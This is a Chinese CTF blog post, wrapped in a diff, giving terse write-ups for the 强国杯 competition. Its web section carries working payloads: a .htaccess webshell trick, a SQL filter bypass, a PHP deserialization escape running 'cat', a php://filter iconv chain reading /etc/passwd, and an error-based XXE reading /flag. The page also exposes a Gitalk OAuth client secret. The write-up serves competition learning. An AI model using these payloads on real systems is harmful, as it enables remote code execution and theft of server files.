@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>强国杯writeup |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="强国杯writeup |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="强国杯writeup"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/lhogMO5Iq/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>强国杯writeup</h1>
+            <span class="meta">
+            	Posted on
+              2022-07-17，9 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <h2 id="前言">前言</h2>
+<p>属于是万年老二了</p>
+<figure data-type="image" tabindex="1"><img src="https://c.img.dasctf.com/images/2022717/1658029672795-baf93f64-e374-4e95-8867-bf2fc359ea96.png" alt="" loading="lazy"></figure>
+<h1 id="upload_lol">upload_lol</h1>
+<p>.htaccess</p>
+<pre><code>AddType application/x-httpd-php .wuwu
+php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.wuwu&quot;
+</code></pre>
+<p>再写个shell.wuwu。base64一句话</p>
+<p>/var/flag</p>
+<h1 id="file_sql_new">file_sql_new</h1>
+<p>select替换为空</p>
+<p>union selselectect 一把嗦</p>
+<h1 id="ezpop_new">ezpop_new</h1>
+<p>反序列化逃逸。</p>
+<pre><code>&lt;?php
+class Alice{
+    public function __construct($c){
+        $this-&gt;c=$c;
+    }
+}
+class Bob{
+    public $flag=True;
+}
+
+echo(serialize(new ALice(new Bob())));
+</code></pre>
+<pre><code>?pop=O:5:&quot;Alice&quot;:1:{s:1:&quot;c&quot;;O:3:&quot;Bob&quot;:1:{s:4:&quot;flag&quot;;b:1;}&amp;someone=
+flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagfopen;cat /fla?&quot;;s:5:&quot;phone&quot;;O:9:&quot;PingUtils&quot;:0:{}}
+</code></pre>
+<h1 id="ezweb_new">ezweb_new</h1>
+<pre><code>老姿势。unicode 字符串+filter构造一句话
+http://47.94.151.201:31863/?%E2%80%AEimaohw?%E2%81%A6%E2%81%A9%E2%81%A6whoami=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd
+</code></pre>
+<p>ps有java。代理出来。是个xxe</p>
+<p>tmp下写个dtd</p>
+<pre><code>&lt;!ENTITY % condition &quot;and | or | not | equal | contains | exists | subdomain-of&quot;&gt;
+&lt;!ELEMENT pattern (%condition;)&gt;
+</code></pre>
+<pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE message [
+&lt;!ENTITY % local_dtd SYSTEM &quot;file:///tmp/1.dtd&quot;&gt;
+    &lt;!ENTITY % condition 'aaa)&gt;
+        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;
+        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
+        &amp;#x25;eval;
+        &amp;#x25;error;
+        &lt;!ELEMENT aa (bb'&gt;
+    %local_dtd;
+]&gt;
+&lt;user&gt;
+            &lt;username&gt;flag&lt;/username&gt;
+            &lt;password&gt;root&lt;/password&gt;
+&lt;/user&gt;
+</code></pre>
+<pre><code> iconv -f utf8 -t UTF-32LE  1.xml &gt; 2.xml;proxychains python2 1.py 2.xml
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://c.img.dasctf.com/images/2022716/1657959113871-ac7c2b6a-439e-4528-b515-1f0cfbabe167.png" alt="image-20220716161151670" loading="lazy"></figure>
+<h1 id="大佬大佬">大佬大佬</h1>
+<p>lsb+图片尺寸</p>
+<figure data-type="image" tabindex="3"><img src="https://c.img.dasctf.com/images/2022716/1657935035193-5f4e42cd-83dc-4069-81fe-5547bb21b136.png" alt="image-20220716093026701" loading="lazy"></figure>
+<h1 id="找找gif">找找GIF</h1>
+<p>aaa拉高是bbb密码</p>
+<p>bbb加gif文件头</p>
+<figure data-type="image" tabindex="4"><img src="https://c.img.dasctf.com/images/2022716/1657959315624-eec030d9-5b12-448a-b430-810a66d880a6.png" alt="image-20220716161513826" loading="lazy"></figure>
+<h1 id="the-fun-picture">The fun picture</h1>
+<p>爆破密码</p>
+<figure data-type="image" tabindex="5"><img src="https://c.img.dasctf.com/images/2022716/1657959350057-ee346f45-c2d1-483f-a86c-9f9e78aa56fe.png" alt="image-20220716161549762" loading="lazy"></figure>
+<p>加png文件头</p>
+<p>扫描二维码base64</p>
+<h1 id="welcome_to_qgb">Welcome_to_QGB</h1>
+<p>base64</p>
+<h1 id="btch">B@tCh</h1>
+<p>https://blog.csdn.net/Hunter98234/article/details/108672926</p>
+<p>改改脚本</p>
+<figure data-type="image" tabindex="6"><img src="https://c.img.dasctf.com/images/2022716/1657969256536-2c4b6ae0-7f6e-48ca-8c5b-3809e2556790.png" alt="image-20220716190047341" loading="lazy"></figure>
+<p>把原来url的逻辑去掉。从第九个字符开始</p>
+<figure data-type="image" tabindex="7"><img src="https://c.img.dasctf.com/images/2022716/1657969268623-7dba8f81-5f5b-4e93-b2cd-c97d46abb51d.png" alt="image-20220716190107814" loading="lazy"></figure>
+<h1 id="babyrsa">babyRSA</h1>
+<p>网上很多pqec直接嗦的脚本。跑不起来。</p>
+<p>报错</p>
+<pre><code>ZeroDivisionError: invert() no inverse exists
+</code></pre>
+<pre><code>搜到gcd(e,phi)发现是3。
+直接带入
+d = gmpy2.invert(e//3, phi_n)
+</code></pre>
+<p>后面e就=3低指数</p>
+<pre><code>https://xz.aliyun.com/t/2446#toc-15
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://c.img.dasctf.com/images/2022716/1657976648636-b9c7fd89-1193-4b19-93a4-fd03b30f5cd3.png" alt="image-20220716210406408" loading="lazy"></figure>
+<p>直接抄就完事了</p>
+<pre><code>import gmpy2
+from Crypto.Util.number import long_to_bytes
+
+p = 165183720742741436051373219716388644270093189046466421563632727622389425827620783096218651072108769567350808642169644915755493944233905573858905774991122631609402471527613272585988802294622263573574301013199411535656758222265554222107815469076608655188293263358371274025455477828555535371028164366376886408977
+q = 120848273460784230746197749214740170558670241437030497317956826606952430354830550737450520592481405802317202852411775956584677841602475259120706429378240071206662182089399302414435162197602907213282222144680788273948123482886712835590321726087823477518087588076504167863011019333002124841000448268076303735731
+e = 33
+c = 10407733127291995335613764691145477155502676597183852092212444772475748406250517097288411248334115120781386833588013995106957807313657632637086223225958539244315092039575434338289689184523710991223212333496000621300008178955253701172159259970353872359828291763446333588873982621853358272632447440961028670921631505593309092190417674648927653583956106734654954561031328286272044755552317084498103486458373580383410475085969677647030080606373264155592552338785789990114607084241499363324045488462563945268471178702696791804080490936763759252660049728533344304874474003893472238560682850602644793844258072019357796047919
+n = p * q
+phi_n = (p - 1) * (q - 1)
+d = gmpy2.invert(e // 3, phi_n)
+c = pow(c, d, n)
+for i in range(200000000):
+    if gmpy2.iroot(c + n * i, 3)[1] == 1:
+        res = gmpy2.iroot(c + n * i, 3)[0]
+        print(long_to_bytes(res))
+
+</code></pre>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/q21l4TNA-/">
+              <span class="post-title">
+                DSCTF webwriteup&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br ><!--test--></a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
